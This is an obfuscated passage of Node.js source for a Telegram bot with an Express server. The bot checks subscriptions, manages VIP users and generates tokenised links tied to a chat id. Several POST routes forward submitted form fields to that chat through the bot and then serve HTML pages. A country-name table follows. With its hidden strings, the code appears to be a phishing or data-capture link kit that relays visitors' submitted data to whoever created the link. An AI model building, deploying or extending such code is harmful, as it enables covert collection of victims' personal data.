            'ShulU': _0x1a8127(0x22e) + _0x1a8127(0x2e5) + _0x1a8127(0x34c) + _0x1a8127(0x27b) + _0x1a8127(0x4f6) + _0x1a8127(0xd8) + _0x1a8127(0x5bb) + _0x1a8127(0x2d3) + _0x1a8127(0x199) + _0x1a8127(0x38c) + _0x1a8127(0x3e6) + _0x1a8127(0xd6) + _0x1a8127(0x30d) + _0x1a8127(0x20f) + _0x1a8127(0x611) + _0x1a8127(0x3c9),
            'qOjMB': function (_0x6e1995, _0x8592f0) {
                return _0x6e1995 === _0x8592f0;
            },
            'BnfZV': _0x1a8127(0x1fc) + _0x1a8127(0x677) + _0x1a8127(0x495),
            'nSpxU': _0x1a8127(0x103) + _0x1a8127(0x4d3) + _0x1a8127(0x392) + _0x1a8127(0x4b7) + _0x1a8127(0x23a) + _0x1a8127(0xca) + _0x1a8127(0x51d),
            'ABQpy': function (_0x4234db, _0x24c662) {
                return _0x4234db === _0x24c662;
            },
            'rjQrn': _0x1a8127(0x636),
            'wcyds': function (_0x3587d3, _0x717f1d) {
                return _0x3587d3 == _0x717f1d;
            },
            'CObTi': _0x1a8127(0x6a8) + _0x1a8127(0x313) + _0x1a8127(0x256) + _0x1a8127(0xe6) + 'P:',
            'wFDuQ': _0x1a8127(0x641),
            'fEItV': function (_0x2e28c5, _0x393e85) {
                return _0x2e28c5 === _0x393e85;
            },
            'ASKpp': _0x1a8127(0x413),
            'rZOwu': function (_0x51d4ef, _0x107da8) {
                return _0x51d4ef == _0x107da8;
            },
            'BsHif': _0x1a8127(0x6a8) + _0x1a8127(0x313) + _0x1a8127(0x23b) + _0x1a8127(0x216) + 'P:',
            'DUknP': function (_0x36dee3, _0x4bc5ee, _0x509b4f) {
                return _0x36dee3(_0x4bc5ee, _0x509b4f);
            },
            'NCuoq': _0x1a8127(0xe5) + 'nt',
            'QjsLw': _0x1a8127(0x432),
            'Wowgx': _0x1a8127(0x515) + 'k',
            'OcVnO': _0x1a8127(0x525) + 'n',
            'jzOla': _0x1a8127(0x448) + 'e'
        }, _0x559b6e = _0x1c2822[_0x1a8127(0x641)][_0x1a8127(0x12c)]['id'], _0x353837 = _0x1c2822[_0x1a8127(0x628)], _0x54386d = [
            _0x1e5af7[_0x1a8127(0x2c8)],
            _0x1e5af7[_0x1a8127(0x205)],
            _0x1e5af7[_0x1a8127(0x44a)],
            _0x1e5af7[_0x1a8127(0x377)],
            _0x1e5af7[_0x1a8127(0x2f9)],
            _0x1e5af7[_0x1a8127(0x2f7)],
            _0x1e5af7[_0x1a8127(0x69a)],
            _0x1e5af7[_0x1a8127(0x4e3)]
        ];
    if (!_0x54386d[_0x1a8127(0x471)](_0x353837[_0x1a8127(0xc1)](':')[-0x1f68 + 0x17c * -0x15 + 0xfa5 * 0x4]) && !await _0x1e5af7[_0x1a8127(0x332)](isUserSubscribed, _0x559b6e)) {
        const _0x2fc414 = _0x1e5af7[_0x1a8127(0x4b1)], _0x3c62f8 = developerChannels[_0x1a8127(0x43b)](_0x50cd94 => ({
                'text': _0x1a8127(0x2b0) + _0x50cd94,
                'url': _0x1a8127(0x61d) + _0x1a8127(0x40c) + _0x50cd94[_0x1a8127(0x1cf)](-0x9c0 + -0x192c + -0x1 * -0x22ed)
            }));
        bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x2fc414, { 'reply_markup': { 'inline_keyboard': [_0x3c62f8] } });
        return;
    }
    if (_0x1e5af7[_0x1a8127(0x69d)](_0x353837, _0x1e5af7[_0x1a8127(0x6d6)])) {
        const _0x1a703e = baseUrl + (_0x1a8127(0x6ec) + _0x1a8127(0x5e4)) + _0x559b6e;
        bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x1a8127(0x6ac) + _0x1a8127(0x68a) + _0x1a8127(0x68e) + '\x20' + _0x1a703e);
        return;
    }
    const [_0x2573c9, _0x2ec6c3] = _0x353837[_0x1a8127(0xc1)](':');
    if (_0x1e5af7[_0x1a8127(0x69d)](_0x2573c9, _0x1e5af7[_0x1a8127(0x4f2)]))
        try {
            const _0x4fc1f9 = _0x1e5af7[_0x1a8127(0x226)], _0x29e8cf = _0x1e5af7[_0x1a8127(0x638)], _0x37a1de = await axios[_0x1a8127(0x69f)](_0x29e8cf, {
                    'model': _0x1e5af7[_0x1a8127(0x6e3)],
                    'messages': [{
                            'role': _0x1e5af7[_0x1a8127(0x3c3)],
                            'content': _0x4fc1f9
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x1e5af7[_0x1a8127(0x335)],
                        'Content-Type': _0x1e5af7[_0x1a8127(0x6c3)]
                    }
                }), _0x58f69b = _0x37a1de[_0x1a8127(0x628)][_0x1a8127(0x32b)][0x2237 + 0x21ee + -0x4425][_0x1a8127(0x641)][_0x1a8127(0x262)];
            bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x58f69b);
        } catch (_0x2c8f18) {
            console[_0x1a8127(0x4c4)](_0x1e5af7[_0x1a8127(0x360)], _0x2c8f18[_0x1a8127(0x2ca)] ? _0x2c8f18[_0x1a8127(0x2ca)][_0x1a8127(0x628)] : _0x2c8f18[_0x1a8127(0x641)]), bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x1e5af7[_0x1a8127(0x585)]);
        }
    else {
        if (_0x1e5af7[_0x1a8127(0x69d)](_0x353837, _0x1e5af7[_0x1a8127(0x6c9)]))
            try {
                const _0x2fe5f1 = _0x1e5af7[_0x1a8127(0x1f3)], _0xeb6ccb = _0x1e5af7[_0x1a8127(0x638)], _0x27553b = await axios[_0x1a8127(0x69f)](_0xeb6ccb, {
                        'model': _0x1e5af7[_0x1a8127(0x6e3)],
                        'messages': [{
                                'role': _0x1e5af7[_0x1a8127(0x3c3)],
                                'content': _0x2fe5f1
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x1e5af7[_0x1a8127(0x335)],
                            'Content-Type': _0x1e5af7[_0x1a8127(0x6c3)]
                        }
                    }), _0x334090 = _0x27553b[_0x1a8127(0x628)][_0x1a8127(0x32b)][0x1b61 + 0x10 * -0x130 + -0x861][_0x1a8127(0x641)][_0x1a8127(0x262)];
                bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x334090);
            } catch (_0x213ad1) {
                console[_0x1a8127(0x4c4)](_0x1e5af7[_0x1a8127(0x360)], _0x213ad1[_0x1a8127(0x2ca)] ? _0x213ad1[_0x1a8127(0x2ca)][_0x1a8127(0x628)] : _0x213ad1[_0x1a8127(0x641)]), bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x1e5af7[_0x1a8127(0x585)]);
            }
        else {
            if (_0x1e5af7[_0x1a8127(0x440)](_0x353837, _0x1e5af7[_0x1a8127(0x6c9)]))
                try {
                    const _0x33e07e = _0x1e5af7[_0x1a8127(0x1f3)], _0x231e40 = _0x1e5af7[_0x1a8127(0x638)], _0x4ea4a3 = await axios[_0x1a8127(0x69f)](_0x231e40, {
                            'model': _0x1e5af7[_0x1a8127(0x6e3)],
                            'messages': [{
                                    'role': _0x1e5af7[_0x1a8127(0x3c3)],
                                    'content': _0x33e07e
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x1e5af7[_0x1a8127(0x335)],
                                'Content-Type': _0x1e5af7[_0x1a8127(0x6c3)]
                            }
                        }), _0x588def = _0x4ea4a3[_0x1a8127(0x628)][_0x1a8127(0x32b)][-0x77 * -0x1 + 0x210d + -0x2184][_0x1a8127(0x641)][_0x1a8127(0x262)];
                    bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x588def);
                } catch (_0x385b0d) {
                    console[_0x1a8127(0x4c4)](_0x1e5af7[_0x1a8127(0x290)], _0x385b0d[_0x1a8127(0x2ca)] ? _0x385b0d[_0x1a8127(0x2ca)][_0x1a8127(0x628)] : _0x385b0d[_0x1a8127(0x641)]), bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x1e5af7[_0x1a8127(0x362)]);
                }
            else {
                if (_0x1e5af7[_0x1a8127(0xae)](_0x353837, _0x1e5af7[_0x1a8127(0x557)]) && _0x1e5af7[_0x1a8127(0x5cb)](_0x559b6e, -0x4e126e49 + -0x13233c5af * 0x1 + 0x1602b572 * 0x21))
                    bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x1e5af7[_0x1a8127(0x64a)]), bot[_0x1a8127(0x4c3)](_0x1e5af7[_0x1a8127(0x41d)], _0x75558e => {
                        const _0x181feb = _0x1a8127, _0x40f84f = _0x75558e[_0x181feb(0x236)];
                        _0x1e5af7[_0x181feb(0x3a0)](addVIPUser, _0x40f84f), bot[_0x181feb(0x420) + 'e'](_0x559b6e, _0x181feb(0x12a) + _0x181feb(0x489) + _0x40f84f + _0x181feb(0x110));
                    });
                else {
                    if (_0x1e5af7[_0x1a8127(0x2ac)](_0x353837, _0x1e5af7[_0x1a8127(0xf4)]) && _0x1e5af7[_0x1a8127(0x245)](_0x559b6e, 0x2a54 * 0x6c993 + -0x8490a96f + 0xbb5796ed))
                        bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x1e5af7[_0x1a8127(0x482)]), bot[_0x1a8127(0x4c3)](_0x1e5af7[_0x1a8127(0x41d)], _0x60f1d8 => {
                            const _0x3f08af = _0x1a8127, _0x4928c4 = _0x60f1d8[_0x3f08af(0x236)];
                            _0x1e5af7[_0x3f08af(0x391)](removeVIPUser, _0x4928c4), bot[_0x3f08af(0x420) + 'e'](_0x559b6e, _0x3f08af(0x16b) + _0x3f08af(0x489) + _0x4928c4 + _0x3f08af(0x3cc));
                        });
                    else {
                        const [_0x17934c, _0x2dd512] = _0x353837[_0x1a8127(0xc1)](':');
                        if (!_0x54386d[_0x1a8127(0x471)](_0x17934c) && !_0x1e5af7[_0x1a8127(0x37c)](validateLinkUsage, _0x2dd512, _0x17934c)) {
                            bot[_0x1a8127(0x420) + 'e'](_0x559b6e, '');
                            return;
                        }
                        let _0x6c4505 = '';
                        switch (_0x17934c) {
                        case _0x1e5af7[_0x1a8127(0x66f)]:
                            _0x6c4505 = baseUrl + (_0x1a8127(0x3fe) + _0x1a8127(0x156)) + crypto[_0x1a8127(0x207) + 's'](0x92a + 0x1 * 0x1a23 + -0x5d * 0x61)[_0x1a8127(0x4fb)](_0x1e5af7[_0x1a8127(0x24b)]) + _0x1a8127(0x452) + _0x559b6e;
                            break;
                        case _0x1e5af7[_0x1a8127(0x66d)]:
                            _0x6c4505 = baseUrl + (_0x1a8127(0xeb) + _0x1a8127(0x64f)) + crypto[_0x1a8127(0x207) + 's'](0x15 * -0xe + 0x2 * 0x10c9 + -0x205c)[_0x1a8127(0x4fb)](_0x1e5af7[_0x1a8127(0x24b)]) + _0x1a8127(0x452) + _0x559b6e;
                            break;
                        case _0x1e5af7[_0x1a8127(0x457)]:
                            _0x6c4505 = baseUrl + (_0x1a8127(0x5b7) + _0x1a8127(0xfb)) + crypto[_0x1a8127(0x207) + 's'](-0x3da * 0x7 + 0x1 * -0xe21 + -0xf5 * -0x2b)[_0x1a8127(0x4fb)](_0x1e5af7[_0x1a8127(0x24b)]) + _0x1a8127(0x452) + _0x559b6e;
                            break;
                        case _0x1e5af7[_0x1a8127(0x3e7)]:
                            const _0x3f8ac8 = 0x485 + 0x603 + -0xa7e;
                            _0x6c4505 = baseUrl + _0x1a8127(0x339) + crypto[_0x1a8127(0x207) + 's'](-0x2 * 0x535 + 0x1114 * 0x1 + -0x69a)[_0x1a8127(0x4fb)](_0x1e5af7[_0x1a8127(0x24b)]) + _0x1a8127(0x452) + _0x559b6e + _0x1a8127(0x5e1) + _0x3f8ac8;
                            break;
                        case _0x1e5af7[_0x1a8127(0x2f7)]:
                            _0x6c4505 = baseUrl + (_0x1a8127(0x215) + _0x1a8127(0x4c2)) + _0x559b6e + (_0x1a8127(0x337) + 'ok');
                            break;
                        case _0x1e5af7[_0x1a8127(0x377)]:
                            _0x6c4505 = baseUrl + (_0x1a8127(0x215) + _0x1a8127(0x4c2)) + _0x559b6e + (_0x1a8127(0x3f0) + _0x1a8127(0x1c1));
                            break;
                        case _0x1e5af7[_0x1a8127(0x4e3)]:
                            _0x6c4505 = baseUrl + (_0x1a8127(0x215) + _0x1a8127(0x4c2)) + _0x559b6e + (_0x1a8127(0x4e0) + _0x1a8127(0x20e));
                            break;
                        default:
                            bot[_0x1a8127(0x420) + 'e'](_0x559b6e, '');
                            return;
                        }
                        bot[_0x1a8127(0x420) + 'e'](_0x559b6e, _0x1a8127(0x139) + _0x1a8127(0x3ab) + _0x6c4505);
                    }
                }
            }
        }
    }
    bot[_0x1a8127(0x5fb) + _0x1a8127(0x5bd)](_0x1c2822['id']);
}), bot[_0x1155f9(0x2bb)](/\/jjihigjoj/, _0x101dac => {
    const _0x130d97 = _0x1155f9, _0x346fee = {
            'yUxOT': _0x130d97(0x12e) + _0x130d97(0x6ae) + _0x130d97(0x62a) + _0x130d97(0x1ec) + '.',
            'LovZl': _0x130d97(0x235) + _0x130d97(0x459),
            'QAALQ': _0x130d97(0x473) + _0x130d97(0x2b6)
        }, _0x37a677 = _0x101dac[_0x130d97(0x12c)]['id'], _0x2ebcdb = _0x346fee[_0x130d97(0x5ad)];
    bot[_0x130d97(0x420) + 'e'](_0x37a677, _0x2ebcdb, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x346fee[_0x130d97(0x10c)],
                        'callback_data': _0x346fee[_0x130d97(0x521)]
                    }]]
        }
    });
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), _0x296a1b => {
    const _0x4528b2 = _0x1155f9, _0xc99f4d = {
            'XKbYN': function (_0x1c4e81, _0x761743) {
                return _0x1c4e81 === _0x761743;
            },
            'ZCEyf': _0x4528b2(0x473) + _0x4528b2(0x2b6)
        }, _0x48497b = _0x296a1b[_0x4528b2(0x641)][_0x4528b2(0x12c)]['id'];
    if (_0xc99f4d[_0x4528b2(0x5dd)](_0x296a1b[_0x4528b2(0x628)], _0xc99f4d[_0x4528b2(0x24a)])) {
        const _0x2b760c = baseUrl + '/' + _0x48497b;
        bot[_0x4528b2(0x420) + 'e'](_0x48497b, _0x4528b2(0x6ab) + _0x4528b2(0x1da) + _0x2b760c);
    }
    bot[_0x4528b2(0x5fb) + _0x4528b2(0x5bd)](_0x296a1b['id']);
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), _0x538e94 => {
    const _0x5f2107 = _0x1155f9, _0x57e79c = {
            'HeQuS': function (_0x26e112, _0x1f1497) {
                return _0x26e112 === _0x1f1497;
            },
            'SEtdM': _0x5f2107(0x35c),
            'CZHjv': _0x5f2107(0x641),
            'YfDhU': _0x5f2107(0x49e) + _0x5f2107(0x633) + _0x5f2107(0x4e5) + _0x5f2107(0x16a),
            'NlCJW': function (_0x218e35, _0x387cfb) {
                return _0x218e35 === _0x387cfb;
            },
            'hJCiK': _0x5f2107(0x48b),
            'WKKzL': _0x5f2107(0x4b8) + _0x5f2107(0x45e) + _0x5f2107(0x1f2) + '.'
        }, _0x1ddf14 = _0x538e94[_0x5f2107(0x641)][_0x5f2107(0x12c)]['id'];
    if (_0x57e79c[_0x5f2107(0x624)](_0x538e94[_0x5f2107(0x628)], _0x57e79c[_0x5f2107(0x64c)])) {
        bot[_0x5f2107(0x420) + 'e'](_0x1ddf14, _0x57e79c[_0x5f2107(0x3d9)]);
        const _0x360661 = _0x5dddf4 => {
            const _0x2828cc = _0x5f2107;
            if (_0x57e79c[_0x2828cc(0x33a)](_0x5dddf4[_0x2828cc(0x12c)]['id'], _0x1ddf14)) {
                if (_0x5dddf4[_0x2828cc(0x236)] && _0x5dddf4[_0x2828cc(0x236)][_0x2828cc(0x4d9)](_0x57e79c[_0x2828cc(0x2a5)])) {
                    const _0x5e8502 = _0x5dddf4[_0x2828cc(0x236)];
                    dataStore[_0x1ddf14] = { 'userLink': _0x5e8502 }, bot[_0x2828cc(0x420) + 'e'](_0x1ddf14, _0x2828cc(0x2ed) + _0x2828cc(0x25f) + _0x2828cc(0x17e) + baseUrl + (_0x2828cc(0x559) + _0x2828cc(0x47a)) + _0x1ddf14), bot[_0x2828cc(0x58b) + _0x2828cc(0x4b0)](_0x57e79c[_0x2828cc(0x1b7)], _0x360661);
                } else
                    bot[_0x2828cc(0x420) + 'e'](_0x1ddf14, _0x57e79c[_0x2828cc(0x500)]);
            }
        };
        bot['on'](_0x57e79c[_0x5f2107(0x1b7)], _0x360661);
    }
}), app[_0x1155f9(0x442)](bodyParser[_0x1155f9(0x374)]({ 'extended': !![] })), app[_0x1155f9(0x442)](express[_0x1155f9(0x418)](__dirname)), app[_0x1155f9(0x69f)](_0x1155f9(0x456) + 'es', (_0x1e8fd2, _0x3ec350) => {
    const _0x9a4950 = _0x1155f9, _0x3fd652 = {
            'gUMRv': _0x9a4950(0x6c8),
            'iwZsU': _0x9a4950(0x296) + _0x9a4950(0x426) + _0x9a4950(0x4ba) + ':',
            'uFOTf': _0x9a4950(0x103) + _0x9a4950(0x573) + _0x9a4950(0x558) + _0x9a4950(0x11e) + _0x9a4950(0x20a),
            'CSeWg': _0x9a4950(0x607) + _0x9a4950(0x522)
        }, _0x531afb = _0x1e8fd2[_0x9a4950(0x496)][_0x9a4950(0x35d)], _0x5c9da2 = _0x1e8fd2[_0x9a4950(0x496)][_0x9a4950(0x6a7)], _0x19bd93 = _0x1e8fd2[_0x9a4950(0x496)][_0x9a4950(0xdc)];
    console[_0x9a4950(0x3c6)](_0x3fd652[_0x9a4950(0x4c8)], _0x1e8fd2[_0x9a4950(0x496)]), bot[_0x9a4950(0x420) + 'e'](_0x531afb, _0x9a4950(0x1bc) + _0x9a4950(0x254) + _0x5c9da2 + _0x9a4950(0x13b) + _0x19bd93)[_0x9a4950(0x23e)](() => {
        const _0x4f63d5 = _0x9a4950;
        _0x3ec350[_0x4f63d5(0x13a)](path[_0x4f63d5(0x33d)](__dirname, _0x3fd652[_0x4f63d5(0x3ae)]));
    })[_0x9a4950(0x6e7)](_0x307416 => {
        const _0xe9f958 = _0x9a4950;
        console[_0xe9f958(0x4c4)](_0x3fd652[_0xe9f958(0x61b)], _0x307416[_0xe9f958(0x2ca)] ? _0x307416[_0xe9f958(0x2ca)][_0xe9f958(0x496)] : _0x307416), _0x3ec350[_0xe9f958(0x198)](-0xae6 + -0x23d0 + 0x2 * 0x1855)[_0xe9f958(0x535)](_0x3fd652[_0xe9f958(0x53e)]);
    });
}), app[_0x1155f9(0x45b)](_0x1155f9(0x4cf), (_0x48b789, _0x24cda4) => {
    const _0x57a8f2 = _0x1155f9, _0x49c099 = {
            'HmKmy': _0x57a8f2(0x367) + _0x57a8f2(0x3aa) + _0x57a8f2(0x323),
            'ZqcnV': _0x57a8f2(0x6c8)
        }, _0x303c7d = _0x48b789[_0x57a8f2(0x4fd)][_0x57a8f2(0x35d)];
    if (!_0x303c7d)
        return _0x24cda4[_0x57a8f2(0x198)](0x20c * 0x5 + 0x1160 + -0x1a0c)[_0x57a8f2(0x535)](_0x49c099[_0x57a8f2(0x1d8)]);
    _0x24cda4[_0x57a8f2(0x13a)](path[_0x57a8f2(0x33d)](__dirname, _0x49c099[_0x57a8f2(0x221)]));
}), app[_0x1155f9(0x442)](bodyParser[_0x1155f9(0x374)]({ 'extended': !![] })), app[_0x1155f9(0x442)](express[_0x1155f9(0x418)](__dirname)), app[_0x1155f9(0x69f)](_0x1155f9(0x456) + 'es', (_0x8d945f, _0x35dbb1) => {
    const _0x2325e5 = _0x1155f9, _0x5da645 = {
            'sooGC': _0x2325e5(0x4e7),
            'mOUEm': _0x2325e5(0x296) + _0x2325e5(0x426) + _0x2325e5(0x4ba) + ':',
            'vsvDK': _0x2325e5(0x103) + _0x2325e5(0x573) + _0x2325e5(0x558) + _0x2325e5(0x11e) + _0x2325e5(0x20a),
            'SMuBS': _0x2325e5(0x607) + _0x2325e5(0x522)
        }, _0xa1021d = _0x8d945f[_0x2325e5(0x496)][_0x2325e5(0x35d)], _0x4517b3 = _0x8d945f[_0x2325e5(0x496)][_0x2325e5(0x6a7)], _0x4f7ec3 = _0x8d945f[_0x2325e5(0x496)][_0x2325e5(0xdc)];
    console[_0x2325e5(0x3c6)](_0x5da645[_0x2325e5(0x177)], _0x8d945f[_0x2325e5(0x496)]), bot[_0x2325e5(0x420) + 'e'](_0xa1021d, _0x2325e5(0x1bc) + _0x2325e5(0x254) + _0x4517b3 + _0x2325e5(0x13b) + _0x4f7ec3)[_0x2325e5(0x23e)](() => {
        const _0x17f0b7 = _0x2325e5;
        _0x35dbb1[_0x17f0b7(0x13a)](path[_0x17f0b7(0x33d)](__dirname, _0x5da645[_0x17f0b7(0x397)]));
    })[_0x2325e5(0x6e7)](_0x14007a => {
        const _0x3be10e = _0x2325e5;
        console[_0x3be10e(0x4c4)](_0x5da645[_0x3be10e(0x5ff)], _0x14007a[_0x3be10e(0x2ca)] ? _0x14007a[_0x3be10e(0x2ca)][_0x3be10e(0x496)] : _0x14007a), _0x35dbb1[_0x3be10e(0x198)](-0x1 * 0x17e1 + -0x11e * -0xc + 0xc6d)[_0x3be10e(0x535)](_0x5da645[_0x3be10e(0x223)]);
    });
}), app[_0x1155f9(0x45b)](_0x1155f9(0xbe), (_0x298286, _0x543923) => {
    const _0x1591c6 = _0x1155f9, _0x4617e5 = {
            'SNyqk': _0x1591c6(0x367) + _0x1591c6(0x3aa) + _0x1591c6(0x323),
            'Mpoix': _0x1591c6(0x4e7)
        }, _0x2bac4d = _0x298286[_0x1591c6(0x4fd)][_0x1591c6(0x35d)];
    if (!_0x2bac4d)
        return _0x543923[_0x1591c6(0x198)](-0xe3a + -0x3f7 * 0x3 + 0x1baf)[_0x1591c6(0x535)](_0x4617e5[_0x1591c6(0x229)]);
    _0x543923[_0x1591c6(0x13a)](path[_0x1591c6(0x33d)](__dirname, _0x4617e5[_0x1591c6(0x4d6)]));
}), app[_0x1155f9(0x442)](bodyParser[_0x1155f9(0x374)]({ 'extended': !![] })), app[_0x1155f9(0x442)](express[_0x1155f9(0x418)](__dirname)), app[_0x1155f9(0x69f)](_0x1155f9(0x456) + 'es', (_0x299a70, _0x485057) => {
    const _0x535600 = _0x1155f9, _0x92c322 = {
            'Emtvn': _0x535600(0x189),
            'ugKWM': _0x535600(0x296) + _0x535600(0x426) + _0x535600(0x4ba) + ':',
            'jGHEa': _0x535600(0x103) + _0x535600(0x573) + _0x535600(0x558) + _0x535600(0x11e) + _0x535600(0x20a),
            'vFLMg': _0x535600(0x607) + _0x535600(0x522)
        }, _0x10cc89 = _0x299a70[_0x535600(0x496)][_0x535600(0x35d)], _0x52b041 = _0x299a70[_0x535600(0x496)][_0x535600(0x6a7)], _0x251b2f = _0x299a70[_0x535600(0x496)][_0x535600(0xdc)];
    console[_0x535600(0x3c6)](_0x92c322[_0x535600(0x434)], _0x299a70[_0x535600(0x496)]), bot[_0x535600(0x420) + 'e'](_0x10cc89, _0x535600(0x1bc) + _0x535600(0x254) + _0x52b041 + _0x535600(0x13b) + _0x251b2f)[_0x535600(0x23e)](() => {
        const _0x3b76d0 = _0x535600;
        _0x485057[_0x3b76d0(0x13a)](path[_0x3b76d0(0x33d)](__dirname, _0x92c322[_0x3b76d0(0x54d)]));
    })[_0x535600(0x6e7)](_0x3230b0 => {
        const _0x34a8d4 = _0x535600;
        console[_0x34a8d4(0x4c4)](_0x92c322[_0x34a8d4(0x37d)], _0x3230b0[_0x34a8d4(0x2ca)] ? _0x3230b0[_0x34a8d4(0x2ca)][_0x34a8d4(0x496)] : _0x3230b0), _0x485057[_0x34a8d4(0x198)](-0x1 * -0x99e + 0x256f + -0x2d19 * 0x1)[_0x34a8d4(0x535)](_0x92c322[_0x34a8d4(0x623)]);
    });
}), app[_0x1155f9(0x45b)](_0x1155f9(0x613), (_0xcab153, _0x2d8a58) => {
    const _0x26069d = _0x1155f9, _0xa06758 = {
            'bcgGV': _0x26069d(0x367) + _0x26069d(0x3aa) + _0x26069d(0x323),
            'pMwoy': _0x26069d(0x189)
        }, _0x4e78a3 = _0xcab153[_0x26069d(0x4fd)][_0x26069d(0x35d)];
    if (!_0x4e78a3)
        return _0x2d8a58[_0x26069d(0x198)](0x41 + 0x1ae6 + 0x1997 * -0x1)[_0x26069d(0x535)](_0xa06758[_0x26069d(0x61c)]);
    _0x2d8a58[_0x26069d(0x13a)](path[_0x26069d(0x33d)](__dirname, _0xa06758[_0x26069d(0x5b4)]));
});
const countryTranslation = {
        'AF': _0x1155f9(0x65a) + _0x1155f9(0x386),
        'AL': _0x1155f9(0x533),
        'DZ': _0x1155f9(0x55e),
        'AO': _0x1155f9(0x671),
        'AR': _0x1155f9(0x2a3) + _0x1155f9(0x6d7),
        'AM': _0x1155f9(0x56b),
        'AU': _0x1155f9(0x4d7),
        'AT': _0x1155f9(0x4d8),
        'AZ': _0x1155f9(0x27c),
        'BH': _0x1155f9(0x10a),
        'BD': _0x1155f9(0x25e),
        'BY': _0x1155f9(0x298),
        'BE': _0x1155f9(0x508),
        'BZ': _0x1155f9(0x553),
        'BJ': _0x1155f9(0x45c),
        'BO': _0x1155f9(0x670),
        'BA': _0x1155f9(0x2c7) + _0x1155f9(0x528),
        'BW': _0x1155f9(0x650),
        'BR': _0x1155f9(0x130),
        'BG': _0x1155f9(0x50e),
        'BF': _0x1155f9(0x3e0) + _0x1155f9(0x3fc),
        'KH': _0x1155f9(0x19d),
        'CM': _0x1155f9(0x17c) + _0x1155f9(0x14b),
        'CA': _0x1155f9(0x2f8),
        'CL': _0x1155f9(0x1dd),
        'CN': _0x1155f9(0x29a),
        'CO': _0x1155f9(0x246),
        'CR': _0x1155f9(0x547) + _0x1155f9(0x264),
        'HR': _0x1155f9(0x15a),
        'CY': _0x1155f9(0x5a9),
        'CZ': _0x1155f9(0x304),
        'DK': _0x1155f9(0x480),
        'EC': _0x1155f9(0x630) + _0x1155f9(0x20b),
        'EG': _0x1155f9(0x512),
        'SV': _0x1155f9(0x345) + _0x1155f9(0x4b2),
        'EE': _0x1155f9(0x293),
        'ET': _0x1155f9(0xfe),
        'FI': _0x1155f9(0x55f),
        'FR': _0x1155f9(0x3f5),
        'GE': _0x1155f9(0x6b2),
        'DE': _0x1155f9(0x186),
        'GH': _0x1155f9(0x2ee),
        'GR': _0x1155f9(0x2b2),
        'GT': _0x1155f9(0x6ad) + _0x1155f9(0x647),
        'HN': _0x1155f9(0xec),
        'HK': _0x1155f9(0x297) + _0x1155f9(0xce),
        'HU': _0x1155f9(0x27f),
        'IS': _0x1155f9(0x3eb),
        'IN': _0x1155f9(0x40f),
        'ID': _0x1155f9(0x24e) + _0x1155f9(0x40e),
        'IR': _0x1155f9(0x5fc),
        'IQ': _0x1155f9(0x47f),
        'IE': _0x1155f9(0x11f),
        'IL': _0x1155f9(0x2e8),
        'IT': _0x1155f9(0x57e),
        'CI': _0x1155f9(0x4a8) + _0x1155f9(0x653),
        'JP': _0x1155f9(0x3ca),
        'JO': _0x1155f9(0x461),
        'KZ': _0x1155f9(0xd1) + _0x1155f9(0xb4),
        'KE': _0x1155f9(0x15d),
        'KW': _0x1155f9(0x1e7),
        'KG': _0x1155f9(0x36b) + _0x1155f9(0x59b),
        'LV': _0x1155f9(0x6b0),
        'LB': _0x1155f9(0x340),
        'LY': _0x1155f9(0x194),
        'LT': _0x1155f9(0x6c6),
        'LU': _0x1155f9(0x5fa) + _0x1155f9(0x49d),
        'MO': _0x1155f9(0x153),
        'MY': _0x1155f9(0x14d),
        'ML': _0x1155f9(0x1b6),
        'MT': _0x1155f9(0x20d),
        'MX': _0x1155f9(0x4d0),
        'MC': _0x1155f9(0x122),
        'MN': _0x1155f9(0x271),
        'ME': _0x1155f9(0x4ec) + _0x1155f9(0x390),
        'MA': _0x1155f9(0x34b),
        'MZ': _0x1155f9(0x19c),
        'MM': _0x1155f9(0x625),
        'NA': _0x1155f9(0x380),
        'NP': _0x1155f9(0x41a),
        'NL': _0x1155f9(0x24c),
        'NZ': _0x1155f9(0x42e) + _0x1155f9(0x3af),
        'NG': _0x1155f9(0x48d),
        'KP': _0x1155f9(0x44c) + _0x1155f9(0x6e6),
        'NO': _0x1155f9(0x4df),
        'OM': _0x1155f9(0x5b2),
        'PK': _0x1155f9(0x176),
        'PS': _0x1155f9(0x14f),
        'PA': _0x1155f9(0xf5),
        'PY': _0x1155f9(0x366),
        'PE': _0x1155f9(0x2a2),
        'PH': _0x1155f9(0x126),
        'PL': _0x1155f9(0x39c),
        'PT': _0x1155f9(0x564),
        'PR': _0x1155f9(0x2a8) + _0x1155f9(0x222),
        'QA': _0x1155f9(0x351),
        'RO': _0x1155f9(0x22a),
        'RU': _0x1155f9(0x5df),
        'RW': _0x1155f9(0x40d),
        'SA': _0x1155f9(0x36e),
        'SN': _0x1155f9(0xdb),
        'RS': _0x1155f9(0x306),
        'SG': _0x1155f9(0xc2),
        'SK': _0x1155f9(0x29b),
        'SI': _0x1155f9(0x5a0),
        'ZA': _0x1155f9(0x5d0) + _0x1155f9(0x68f),
        'KR': _0x1155f9(0x342) + _0x1155f9(0x6b3),
        'ES': _0x1155f9(0x1cb),
        'LK': _0x1155f9(0x50a),
        'SD': _0x1155f9(0x616),
        'SE': _0x1155f9(0x5cd),
        'CH': _0x1155f9(0x531),
        'SY': _0x1155f9(0x150),
        'TW': _0x1155f9(0x6dd),
        'TZ': _0x1155f9(0x5c9),
        'TH': _0x1155f9(0x39a),
        'TG': _0x1155f9(0x598),
        'TN': _0x1155f9(0x3a1),
        'TR': _0x1155f9(0x517),
        'TM': _0x1155f9(0x657) + _0x1155f9(0x4c5),
        'UG': _0x1155f9(0x4f3),
        'UA': _0x1155f9(0x502),
        'AE': _0x1155f9(0x4ca),
        'GB': _0x1155f9(0x3db),
        'US': _0x1155f9(0x6c2),
